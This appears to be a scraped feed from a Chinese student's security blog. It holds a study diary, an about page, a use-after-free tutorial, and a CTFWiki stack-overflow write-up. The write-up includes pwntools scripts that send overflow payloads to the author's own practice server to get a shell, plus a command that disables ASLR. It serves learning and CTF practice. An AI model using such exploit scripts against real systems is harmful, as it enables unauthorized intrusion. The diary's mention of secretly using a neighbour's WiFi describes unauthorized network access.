&lt;li&gt;晚上依然看书，ARM的知识好复杂。。。脑壳好疼，，感觉最近记忆力又下降了，刚学的许多知识都记不住。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-13&#34;&gt;2018-08-13&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;早上打算早起的，然而，又是稍微睡多了一点。。&lt;/li&gt;
&lt;li&gt;下午看一个下午的看雪CTF题目，懂了一些如何识别花指令以及如何去花的知识，小小的收获。&lt;/li&gt;
&lt;li&gt;晚上本来打算看书的，又忍不住看剧 -《沙海》毁原著系列，不过高中看的原著现在也忘记得差不多了，书也就只看了一丢丢。。现在（第二天中午）回想完全忘记看了啥了。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-12&#34;&gt;2018-08-12&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;上午又睡过头了，哎到底要怎样才能改掉这个习惯。。。&lt;/li&gt;
&lt;li&gt;下午还是看CTF的题。。一个下午过去了，还是自己太菜，那么简单的题都不会。。&lt;/li&gt;
&lt;li&gt;晚上看剧不知不觉又熬夜了，怎么管不住自己呢。。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-11&#34;&gt;2018-08-11&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;上午睡过头了，可能是因为室友走了，早上没人关空调，闹钟响了秒关。起床已经11点了。之后弄了下宽带，假期没人交钱，所以只好偷偷桥接隔壁的WIFi了（反正他们也只有一个人）。&lt;/li&gt;
&lt;li&gt;下午开工。。打算看一些Native层的练习（1点做的打算）。。&lt;/li&gt;
&lt;li&gt;一个下午看了一道CTF题，算是挺难的吧。全是Native层的内容。。&lt;/li&gt;
&lt;li&gt;大晚上的看了一下《漏洞战争。。》&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-10&#34;&gt;2018-08-10&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;迷茫的过了一上午，完全不知道干了啥。&lt;/li&gt;
&lt;li&gt;下午暴雨，学了一个下午的ARM，指令有点多，记的脑壳疼。。，晚饭也没吃，eee。&lt;/li&gt;
&lt;li&gt;剩下的唯一室友走，一个人还是有点无聊，看剧吧，回到宿舍还真是无法学习。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-09&#34;&gt;2018-08-09&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;上午到实验室发现断网。。。当然断网也无法阻止我学习。。继续调&lt;/li&gt;
&lt;li&gt;发现挺多ARM汇编忘记，拿出书开始肛。有点晕，睡了一觉，醒来出去了一趟。。&lt;/li&gt;
&lt;li&gt;晚上继续肛ARM知识。。。第一次收到安全客的稿费还是挺高兴的（虽然被拒了几篇。o(╥﹏╥)o）&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-08&#34;&gt;2018-08-08&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;上午继续调昨天剩下的内容，发现IDA7.0失败，试了试6.8 还是失败，不过没像7那样报错，下午继续实施吧。。&lt;/li&gt;
&lt;li&gt;下午3点出发去医院那检验报告。。。&lt;/li&gt;
&lt;li&gt;幸好没啥问题。。出来又是下雨。。先吃药，开学去做个牵引。。&lt;/li&gt;
&lt;li&gt;晚上继续调。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-07&#34;&gt;2018-08-07&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;上午看了一个上午ARM汇编。&lt;/li&gt;
&lt;li&gt;下午试了动态调试Android，做了下题，发现ARM汇编忘记得差不多了，补补。。。。。&lt;/li&gt;
&lt;li&gt;5点出发去医院做检查，排了很久很久。。。出来下雨又累又饿┭┮﹏┭┮。&lt;/li&gt;
&lt;li&gt;晚上有事看剧过去了。。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-06&#34;&gt;2018-08-06&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;今天有个计划。之后把每天分成三个阶段：&lt;/li&gt;
&lt;li&gt;早上：更新计划，看博客，学习linux相关内容。&lt;/li&gt;
&lt;li&gt;下午：看Android相关内容。&lt;/li&gt;
&lt;li&gt;晚上：看剧以及看实体书。&lt;/li&gt;
&lt;li&gt;困了，打游戏可以稍作缓解（一局吃鸡或者王者）又或者出去散散步。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-05&#34;&gt;2018-08-05&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;星期天（每天都是），早上9点起的，看了一些逆向工具的使用。补了一些漏。。&lt;/li&gt;
&lt;li&gt;下午有点迷，天气有点热，还是在看逆向知识。&lt;/li&gt;
&lt;li&gt;晚上一不小心看完了《夏日大作战》。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-03&#34;&gt;2018-08-03&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;晚上看了几篇CVE，迷茫，看不懂，还是去看更基础的吧。。。&lt;/li&gt;
&lt;li&gt;去了校医院，转到了中医药大学附属医院去看。排了一个早上一号，医生直接没来（医生不来为甚要给我成功排号）。&lt;/li&gt;
&lt;li&gt;下午重新排了骨科。开了药以及排了核磁共振号，下周二去拍片（好贵好贵）。。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-08-01&#34;&gt;2018-08-01&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;都到8月了，好像还在迷茫中。。。。&lt;/li&gt;
&lt;li&gt;看完了这篇文章：&lt;a href=&#34;https://azeria-labs.com/the-importance-of-deep-work-the-30-hour-method-for-learning-a-new-skill/&#34;&gt;https://azeria-labs.com/the-importance-of-deep-work-the-30-hour-method-for-learning-a-new-skill/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;如何高效集中式的学习。&lt;/li&gt;
&lt;li&gt;好好开始写日记了。不管多少字。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;2018-07-30&#34;&gt;2018-07-30&lt;/h3&gt;

&lt;p&gt;昨天省赛第二天，AWD线下，3个PWN一个WEB，死磕WEB，在最后10分钟拿了分。&lt;/p&gt;

&lt;p&gt;总结下来还是自己太菜，没办法。。多练练吧。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-28&#34;&gt;2018-07-28&lt;/h3&gt;

&lt;p&gt;省赛，没以前那么水了，7个re中有5个Android,做不出来，对自己失去了希望。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-24&#34;&gt;2018-07-24&lt;/h3&gt;

&lt;p&gt;做CTF,菜的一笔，对人生失去了信心。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-22-23&#34;&gt;2018-07-22-23&lt;/h3&gt;

&lt;p&gt;去校医院看病，转到人民医院去了，花了一个下午，就开了一副药，估计也没什么用。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-18-21&#34;&gt;2018-07-18-21&lt;/h3&gt;

&lt;p&gt;看B站。。。。  补了少许CVE的知识。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-19&#34;&gt;2018-07-19&lt;/h3&gt;

&lt;p&gt;时间都花在看B站上去了。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-15&#34;&gt;2018-07-15&lt;/h3&gt;

&lt;p&gt;太菜，迷茫中。。。。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-12&#34;&gt;2018-07-12&lt;/h3&gt;

&lt;p&gt;列一个假期计划吧，第一：早上尽量早起，不要睡懒觉。第二：争取在这个假期学完linux基础的许多内容，再多练习练习写脚本的技术。补补密码学的知识。第三：加强Android逆向，补一些漏洞的知识（靠翻译和看别人的CVE）。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-10&#34;&gt;2018-07-10&lt;/h3&gt;

&lt;p&gt;假期都过去一周了，好迷茫呀，都不知道做了些什么。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-03-09&#34;&gt;2018-07-03&amp;ndash;09&lt;/h3&gt;

&lt;p&gt;放假了，先迷茫（放松）几天。。&lt;/p&gt;

&lt;h3 id=&#34;2018-07-02&#34;&gt;2018-07-02&lt;/h3&gt;

&lt;p&gt;还是有点受不了原来的主题，Bug有点多，重新换了一个，先立个flag，再也不换主题，就一直修修补补吧。&lt;br /&gt;
  不过golang是真的快呀。&lt;/p&gt;

&lt;h3 id=&#34;2018-06-25-07-01&#34;&gt;2018-06-25&amp;ndash;07-01&lt;/h3&gt;

&lt;p&gt;期末复习ing&lt;/p&gt;

&lt;h3 id=&#34;2018-06-24&#34;&gt;2018-06-24&lt;/h3&gt;

&lt;p&gt;重新开通了博客，基于golang的hugo框架，随便套了个主题，也懒得该些什么，将就用吧。&lt;/p&gt;

&lt;h3 id=&#34;彩蛋&#34;&gt;彩蛋&lt;/h3&gt;

&lt;p&gt;彩蛋就是。。。。。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180809205115.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>关于</title>
      <link>https://naivete.cc/about/</link>
      <pubDate>Sun, 24 Jun 2018 21:38:52 +0800</pubDate>
      
      <guid>https://naivete.cc/about/</guid>
      
        <description>

&lt;p&gt;&lt;center&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/tx.jpg&#34; width=&#34;200&#34; height=&#34;200&#34; &gt;&lt;/p&gt;

&lt;p&gt;一个正在学Android安全的菜鸡&lt;/p&gt;

&lt;p&gt;正在努力变强 充电中  &amp;mdash;&lt;br /&gt;
 &lt;!-- [学习日记](https://naivete.cc/学习日记/)  --&gt;
 &lt;!-- [CTF题目汇总](https://naivete.cc/ctf/)   --&gt;&lt;/p&gt;

&lt;h2 id=&#34;hahahugoshortcode-0xc000290500-1-hbhb&#34;&gt;  &lt;iframe style=&#34;max-width: 100%&#34;
      class=&#34;music163&#34;
      frameborder=&#34;no&#34;
      border=&#34;0&#34;
      marginwidth=&#34;0&#34;
      marginheight=&#34;0&#34;
      width=&#34;330&#34;
      height=&#34;86&#34;
      src=&#34;//music.163.com/outchain/player?type=2&amp;id=496869422&amp;auto=0&amp;height=66&#34;&gt;
    &lt;/iframe&gt;&lt;/h2&gt;

&lt;p&gt;&lt;i class=&#34;fab fa-qq&#34;&gt;&lt;/i&gt;  &lt;strong&gt;QQ&lt;/strong&gt; :  974032325&lt;/p&gt;

&lt;p&gt;&lt;i class=&#34;fab fa-weixin&#34;&gt;&lt;/i&gt;  &lt;strong&gt;个人微信-公众号&lt;/strong&gt;：&lt;br /&gt;
 &lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/MyWeChat.png&#34; alt=&#34;微信&#34; width=&#34;190&#34; height=&#34;190&#34; /&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/myandroidsec.jpg&#34; alt=&#34;微信&#34; width=&#34;190&#34; height=&#34;190&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;/center&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>漏洞基础之3UAF</title>
      <link>https://naivete.cc/post/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%B9%8B3uaf/</link>
      <pubDate>Wed, 20 Mar 2019 15:37:13 +0800</pubDate>
      
      <guid>https://naivete.cc/post/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%B9%8B3uaf/</guid>
      
        <description>&lt;ul&gt;
&lt;li&gt;重写ing&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x00原理&#34;&gt;0x00原理&lt;/h3&gt;

&lt;p&gt;堆内存在释放后被直接再次使用(释放了堆块之后，未将该指针值为NULL,导致指针处于悬空状态，被释放的内存能被恶意利用) 在浏览器中比较常见的漏洞&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;根本原因是：&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;利用&#34;&gt;利用&lt;/h3&gt;

&lt;h5 id=&#34;简单利用&#34;&gt;简单利用&lt;/h5&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
typedef void (*func_ptr)(char *);
void evil_fuc(char command[])
{
system(command);
}
void echo(char content[])
{
printf(&amp;quot;%s&amp;quot;,content);
}
int main()
{
    func_ptr *p1=(func_ptr*)malloc(4*sizeof(int));
    printf(&amp;quot;malloc addr: %p\n&amp;quot;,p1);
    p1[3]=echo;
    p1[3](&amp;quot;hello world\n&amp;quot;);
    free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针
    p1[3](&amp;quot;hello again\n&amp;quot;); //p1指针未被置空,虽然free了,但仍可使用.
    func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.
    printf(&amp;quot;malloc addr: %p\n&amp;quot;,p2);
    printf(&amp;quot;malloc addr: %p\n&amp;quot;,p1);//p2与p1指针指向的内存为同一地址
    p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.
    p1[3](&amp;quot;/bin/sh&amp;quot;);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180912215411.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;pwnable-kr-uaf&#34;&gt;pwnable.kr uaf&lt;/h5&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180912220453.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;先看看源码：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;iostream&amp;gt; 
#include &amp;lt;cstring&amp;gt;
#include &amp;lt;cstdlib&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
using namespace std;

class Human{
private:
    virtual void give_shell(){
        system(&amp;quot;/bin/sh&amp;quot;);
    }
protected:
    int age;
    string name;
public:
    virtual void introduce(){
        cout &amp;lt;&amp;lt; &amp;quot;My name is &amp;quot; &amp;lt;&amp;lt; name &amp;lt;&amp;lt; endl;
        cout &amp;lt;&amp;lt; &amp;quot;I am &amp;quot; &amp;lt;&amp;lt; age &amp;lt;&amp;lt; &amp;quot; years old&amp;quot; &amp;lt;&amp;lt; endl;
    }
};

class Man: public Human{
public:
    Man(string name, int age){
        this-&amp;gt;name = name;
        this-&amp;gt;age = age;
        }
        virtual void introduce(){
        Human::introduce();
                cout &amp;lt;&amp;lt; &amp;quot;I am a nice guy!&amp;quot; &amp;lt;&amp;lt; endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this-&amp;gt;name = name;
                this-&amp;gt;age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout &amp;lt;&amp;lt; &amp;quot;I am a cute girl!&amp;quot; &amp;lt;&amp;lt; endl;
        }
};

int main(int argc, char* argv[]){
    Human* m = new Man(&amp;quot;Jack&amp;quot;, 25);
    Human* w = new Woman(&amp;quot;Jill&amp;quot;, 21);

    size_t len;
    char* data;
    unsigned int op;
    while(1){
        cout &amp;lt;&amp;lt; &amp;quot;1. use\n2. after\n3. free\n&amp;quot;;
        cin &amp;gt;&amp;gt; op;

        switch(op){
            case 1:
                m-&amp;gt;introduce();
                w-&amp;gt;introduce();
                break;
            case 2:
                len = atoi(argv[1]);
                data = new char[len];
                read(open(argv[2], O_RDONLY), data, len);
                cout &amp;lt;&amp;lt; &amp;quot;your data is allocated&amp;quot; &amp;lt;&amp;lt; endl;
                break;
            case 3:
                delete m;
                delete w;
                break;
            default:
                break;
        }
    }

    return 0;    
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;hcft2016-fheap&#34;&gt;HCFt2016 fheap&lt;/h5&gt;

&lt;h5 id=&#34;网鼎杯ctf2018-第一场-pwn-babyheap&#34;&gt;网鼎杯CTF2018 第一场 Pwn Babyheap&lt;/h5&gt;

&lt;p&gt;参考资料：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.cnblogs.com/Ox9A82/p/5320857.html&#34;&gt;https://www.cnblogs.com/Ox9A82/p/5320857.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.cnblogs.com/alert123/p/4918041.html&#34;&gt;https://www.cnblogs.com/alert123/p/4918041.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/qq_31481187/article/details/73612451&#34;&gt;https://blog.csdn.net/qq_31481187/article/details/73612451&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/85281&#34;&gt;https://www.anquanke.com/post/id/85281&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://xz.aliyun.com/t/2609?accounttraceid=ce44f2b3-4957-4509-b7ba-f2bd6eed34d3#toc-4&#34;&gt;https://xz.aliyun.com/t/2609?accounttraceid=ce44f2b3-4957-4509-b7ba-f2bd6eed34d3#toc-4&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/85281&#34;&gt;https://www.anquanke.com/post/id/85281&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
      
    </item>
    
    <item>
      <title>ROP练习</title>
      <link>https://naivete.cc/post/rop%E7%BB%83%E4%B9%A0/</link>
      <pubDate>Thu, 28 Feb 2019 00:22:36 +0800</pubDate>
      
      <guid>https://naivete.cc/post/rop%E7%BB%83%E4%B9%A0/</guid>
      
        <description>

&lt;h3 id=&#34;题目列表&#34;&gt;题目列表：&lt;/h3&gt;

&lt;h4 id=&#34;ip-47-106-212-155&#34;&gt;IP:&lt;code&gt;47.106.212.155&lt;/code&gt;&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;ret2libc3&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;10008&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;ret2shellcode&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;10002&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;ret2libc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;10005&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;train.cs.nctu.edu.tw: rop&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;2013-PlaidCTF-ropasaurusrex&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Defcon 2015 Qualifier: R0pbaby&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;10012&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;train.cs.nctu.edu.tw: ret2libc&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;AliCTF 2016：vss&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;RCTF2015-welpwn&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;10010&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;lctf16-pwn100&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;10011&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;xdctf15-pwn200&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;10013&lt;/p&gt;

&lt;p&gt;WP（持续更新）：&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>CTF PWN刷题记录 CTFWiki_1栈溢出</title>
      <link>https://naivete.cc/post/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/</link>
      <pubDate>Wed, 20 Feb 2019 00:17:21 +0800</pubDate>
      
      <guid>https://naivete.cc/post/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/</guid>
      
        <description>

&lt;hr /&gt;

&lt;blockquote&gt;
&lt;p&gt;看CTFWiki来入门CTF-PWN  (Linux和arm) 做个记录&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;知识点：[PWN相关知识点总结]()&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Linux PWN&lt;/li&gt;
&lt;li&gt;ARM PWN&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;题目全部来源于 &lt;a href=&#34;https://ctf-wiki.github.io/ctf-wiki/pwn/readme/&#34;&gt;CTFWiki&lt;/a&gt; 上所涉及题目&lt;/p&gt;

&lt;h2 id=&#34;linux-pwn&#34;&gt;Linux PWN&lt;/h2&gt;

&lt;p&gt;大部分原理参考&lt;a href=&#34;https://ctf-wiki.github.io/ctf-wiki/pwn/readme/&#34;&gt;CTFWiki&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;栈溢出&#34;&gt;栈溢出&lt;/h4&gt;

&lt;h5 id=&#34;基本栈溢出&#34;&gt;基本栈溢出&lt;/h5&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
void success() { puts(&amp;quot;You Hava already controlled it.&amp;quot;); }
void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;# gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1
stack1.c: In function ‘vulnerable’:
stack1.c:6:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   gets(s);
   ^~~~
   fgets
/tmp/ccNeCYTO.o: In function `vulnerable&#39;:
stack1.c:(.text+0x45): warning: the `gets&#39; function is dangerous and should not be used.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;关闭完全部保护&lt;/p&gt;

&lt;p&gt;步骤：查看gets()写入的地址距离ebp的长度（计算填充长度）-&amp;gt;+ebp的长度-&amp;gt;+返回的地址（success()的地址)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190406211946.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190406212108.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;poc1.py&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#coding=utf-8

from pwn import *

# sh = process(&amp;quot;./stack1&amp;quot;)
sh = remote(&amp;quot;47.106.212.155&amp;quot;,10000)
success_addr = 0x08048456

payload = &#39;a&#39;*0x14 + &#39;bbbb&#39; + p32(success_addr)
sh.sendline(payload)
sh.interactive()

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190406212343.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h5 id=&#34;基本rop&#34;&gt;基本ROP&lt;/h5&gt;

&lt;p&gt;ROP 攻击一般得满足如下条件&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;程序存在溢出，并且可以控制返回地址。&lt;/li&gt;
&lt;li&gt;可以找到满足条件的 gadgets 以及相应 gadgets 的地址。&lt;/li&gt;
&lt;/ul&gt;

&lt;h6 id=&#34;ret2text&#34;&gt;ret2text&lt;/h6&gt;

&lt;p&gt;ret2text 即控制程序执行程序本身已有的的代码 (.text)。&lt;/p&gt;

&lt;p&gt;示例程序：&lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text&#34;&gt;ret2text&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190406214601.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190412180957.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190406220340.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;所以只需ret到&lt;code&gt;0x0804863a&lt;/code&gt;就能getshell&lt;/p&gt;

&lt;p&gt;构造payload&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;计算偏移量&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;使用ragg2&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;ragg2 -P 200 -r &amp;gt; pattern.txt&lt;/code&gt;   or &lt;code&gt;ragg2 -P 200 -r&lt;/code&gt;复制下来&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;   # ragg2 -P 200 -r
  AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;profile.rr2:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;  #!/usr/bin/rarun2
  stdin=./pattern.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;r2 -R profile.rr2 -d ret2text&lt;/code&gt; or 直接&lt;code&gt;r2 -d ret2text&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;dc&lt;/code&gt;后输入复制的pattern字符串&lt;/p&gt;

&lt;p&gt;&lt;code&gt;wopO eip&lt;/code&gt;得到偏移&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190406231721.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;gdb手动计算&lt;/p&gt;

&lt;p&gt;下断点call处：&lt;code&gt;0x080486ae&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190406233003.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190406233035.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190412181030.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;所以偏移为108+4&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;python pattern.py&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;payload&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;  from pwn import *
  
  # sh = process(./ret2text)
  sh = remote(&amp;quot;47.106.212.155&amp;quot;,10001)
  binsh = 0x0804863a
  payload = 112*&#39;A&#39; + p32(binsh)
  sh.sendline(payload)
  sh.interactive()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190412181108.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h6 id=&#34;ret2shellcode&#34;&gt;ret2shellcode&lt;/h6&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode&#34;&gt;ret2shellcode&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;运行时shellcode所在区域应具有可执行权限&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407123948.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407132349.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;strncpy函数将gets的内容复制到buf2 buf存放到.bss段的[0x804a080:4]位置。&lt;/p&gt;

&lt;p&gt;调试看所在.bss段是否有执行的权限。&lt;/p&gt;

